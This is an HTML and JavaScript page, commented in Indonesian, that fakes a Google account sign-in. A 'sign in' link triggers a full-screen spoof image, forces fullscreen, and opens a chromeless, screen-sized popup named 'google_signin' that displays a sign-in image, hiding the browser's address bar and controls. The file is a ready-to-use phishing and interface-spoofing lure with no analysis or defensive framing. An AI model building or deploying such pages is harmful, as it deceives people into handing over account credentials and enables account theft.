<!DOCTYPE HTML>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no">
    <title>URL TESTING WEBVIEW</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            overflow: hidden;
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        #spoof-img {
            display: none;
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
        }
        .signin-link {
            padding: 20px 40px;
            background: #4285f4;
            color: white;
            font-size: 18px;
            text-decoration: none;
            border-radius: 4px;
            cursor: pointer;
            z-index: 10;
            position: relative;
        }
    </style>
    <script>
        // Fullscreen untuk window tertentu
        function goFullscreen(targetWindow) {
            var elem = targetWindow.document.documentElement;
            if (elem.requestFullscreen) elem.requestFullscreen();
            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
            else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
            else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
        }

        function openWin() {
            // 1. Langsung tampilkan spoof.png
            document.getElementById('spoof-img').style.display = 'block';

            // 2. Langsung coba fullscreen di MAIN WINDOW (pasti masih dalam user gesture)
            goFullscreen(window);

            // 3. Sembunyikan tombol setelah 1 detik
            setTimeout(function() {
                document.querySelector('.signin-link').style.display = 'none';
            }, 1000);

            // 4. BUKA POPUP DENGAN DELAY 1 DETIK (setelah main window sudah fullscreen)
            setTimeout(function() {
                var params = 'width=' + screen.width +
                             ',height=' + screen.height +
                             ',top=0,left=0' +
                             ',menubar=no,toolbar=no,location=no,status=no,scrollbars=no,resizable=no';

                var win = window.open("about:blank", "google_signin", params);
                if (win) {
                    win.moveTo(0, 0);
                    win.resizeTo(screen.width, screen.height);

                    // Tulis konten popup dengan gambar sign.png
                    win.document.write(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in</title>
    <style>
        body, html {
            margin: 0; padding: 0; height: 100%; width: 100%;
            background: #fff;
            display: flex; justify-content: center; align-items: center;
            overflow: hidden;
        }
        #sign-img {
            max-width: 100%; max-height: 100%; object-fit: contain;
        }
    </style>
</head>
<body>
    <img id="sign-img" src="sign.png" alt="Sign in with Google">
    <script>
        // Coba fullscreen di popup (opsional, kadang berhasil)
        function tryFS() {
            var elem = document.documentElement;
            if (elem.requestFullscreen) elem.requestFullscreen();
            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
            else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
            else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
        }
        window.addEventListener('load', tryFS);
    <\/script>
</body>
</html>
                    `);

                    win.document.close();
                    win.focus();
                }
            }, 1000); // Delay 1 detik untuk popup
        }
    </script>
</head>
<body>
    <a href="#" class="signin-link" onclick="openWin(); return false;">
        Click here to sign in into your Google Account v2
    </a>

    <img id="spoof-img" src="spoof.png" alt="Google Login Spoof">
</body>
</html>
